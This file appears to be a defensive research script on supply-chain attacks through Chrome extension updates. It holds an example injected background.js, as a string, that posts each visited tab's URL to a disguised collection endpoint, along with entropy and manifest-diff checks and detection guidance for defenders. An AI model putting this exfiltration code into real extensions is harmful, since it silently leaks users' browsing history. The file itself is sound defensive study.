/**
 * Research: Supply Chain Attack Simulation — Malicious Extension Update
 *
 * AUTHORIZED RESEARCH ONLY. This script does not execute any attack.
 * It documents what a malicious Chrome extension update looks like,
 * how an attacker would structure one, and how a defender can detect it.
 *
 * Chrome extensions auto-update silently. The user sees nothing.
 * The update mechanism is the attack vector. The changed file is background.js.
 *
 * Reference: https://attack.mitre.org/techniques/T1195/002/
 */

'use strict';

/**
 * CLEAN BASELINE (what background.js looks like in this repo)
 * This is the expected state — zero outbound connections, audit log only.
 */
const CLEAN_BACKGROUND = `
chrome.runtime.onInstalled.addListener(({ reason }) => {
    logAuditEvent('LIFECYCLE', { event: reason });
});
// No fetch. No XHR. No WebSocket. connect-src 'none' enforces this at CSP level.
`;

/**
 * COMPROMISED VERSION (what a supply chain attacker would ship in an update)
 * This is the delta that should trigger detection.
 * Functionally identical to the user — ads still mute, UI still works.
 * The added code runs silently in the background service worker.
 */
const COMPROMISED_BACKGROUND = `
// [Injected by attacker — visually buried in a 300-line refactor PR]
const C2_ENDPOINT = 'https://analytics-cdn-metrics[.]com/v2/collect';

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        fetch(C2_ENDPOINT, {
            method: 'POST',
            body: JSON.stringify({ url: tab.url, ts: Date.now(), uid: chrome.runtime.id }),
            headers: { 'Content-Type': 'application/json' }
        });
    }
});
`;

/**
 * Entropy Analysis
 * One signal for supply chain compromise: a background.js that was 800 bytes
 * for 18 months suddenly becomes 2400 bytes in a routine update.
 * Size delta alone isn't proof, but it's a tripwire worth monitoring.
 */
function entropyAnalysis(clean, compromised) {
    function shannonEntropy(str) {
        const freq = {};
        for (const c of str) freq[c] = (freq[c] || 0) + 1;
        return -Object.values(freq).reduce((sum, f) => {
            const p = f / str.length;
            return sum + p * Math.log2(p);
        }, 0);
    }

    return {
        cleanSize: clean.trim().length,
        compromisedSize: compromised.trim().length,
        sizeDelta: compromised.trim().length - clean.trim().length,
        cleanEntropy: shannonEntropy(clean).toFixed(4),
        compromisedEntropy: shannonEntropy(compromised).toFixed(4),
        entropyDelta: (shannonEntropy(compromised) - shannonEntropy(clean)).toFixed(4)
    };
}

/**
 * Manifest Diff
 * A permission escalation in an update is the loudest signal available.
 * Chrome warns users when an update requests new permissions — but only if
 * the new permissions require explicit re-approval. Silent additions (like
 * adding a new host match to existing host permissions) do not prompt.
 */
function manifestDiff(cleanManifest, compromisedManifest) {
    const added = {
        permissions: [],
        host_permissions: [],
        content_scripts: []
    };

    const cleanPerms = new Set(cleanManifest.permissions ?? []);
    const compPerms = new Set(compromisedManifest.permissions ?? []);
    for (const p of compPerms) {
        if (!cleanPerms.has(p)) added.permissions.push(p);
    }

    const cleanHosts = new Set(cleanManifest.host_permissions ?? []);
    const compHosts = new Set(compromisedManifest.host_permissions ?? []);
    for (const h of compHosts) {
        if (!cleanHosts.has(h)) added.host_permissions.push(h);
    }

    return added;
}

// --- Simulate ---

console.group('[SUPPLY CHAIN SIM] Malicious Update Analysis');

const analysis = entropyAnalysis(CLEAN_BACKGROUND, COMPROMISED_BACKGROUND);
console.table(analysis);

const cleanManifest = {
    permissions: ['activeTab', 'storage'],
    host_permissions: []
};

const compromisedManifest = {
    permissions: ['activeTab', 'storage', 'tabs', 'webRequest', 'webRequestBlocking'],
    host_permissions: ['<all_urls>']
};

const diff = manifestDiff(cleanManifest, compromisedManifest);
if (diff.permissions.length || diff.host_permissions.length) {
    console.warn('[SUPPLY CHAIN SIM] New permissions in compromised manifest:', diff);
} else {
    console.log('[SUPPLY CHAIN SIM] No permission escalation detected.');
}

console.groupEnd();

/*
    DEFENDER DETECTION GUIDANCE
    ============================
    Monitoring for supply chain compromise in browser extensions:

    1. Hash pinning: Record SHA-256 of background.js and manifest.json at install time.
       Alert on any change that wasn't preceded by an explicit user update action.
       Chrome stores extensions at:
         macOS:   ~/Library/Application Support/Google/Chrome/Default/Extensions/<id>/
         Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\<id>\

    2. Permission diff on update: Chrome extension updates that add new permissions
       should be blocked in enterprise environments via ExtensionInstallForcelist GPO.
       Any update adding webRequest + <all_urls> is high-confidence malicious.

    3. Network baselining: Extensions should have known, stable outbound domains.
       A new POST to a domain registered < 90 days ago from chrome.exe is a
       high-fidelity IOC. C2 domains for extension-based malware often impersonate
       analytics CDNs ("metrics", "telemetry", "cdn-collect").

    4. Entropy monitoring: Large unexplained increases in background.js byte size
       or Shannon entropy post-update are worth automated alerting on.
       Typical benign updates: < 15% size increase.
       Injected harvesting code: often 30-80% size increase.
*/
